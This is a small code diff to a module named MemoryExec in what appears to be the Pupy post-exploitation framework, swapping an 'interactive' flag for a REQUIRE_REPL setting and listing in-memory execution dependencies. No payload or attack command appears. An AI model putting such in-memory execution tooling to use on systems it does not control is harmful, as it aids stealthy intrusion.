@@ -32,7 +32,8 @@ class MemoryExec(PupyModule):
         Execute a executable from memory
     """
 
-    interactive=1
+    io = REQUIRE_REPL
+
     dependencies = {
         'linux': [ 'memexec' ],
         'windows': [ 'pupymemexec', 'pupwinutils.memexec' ]
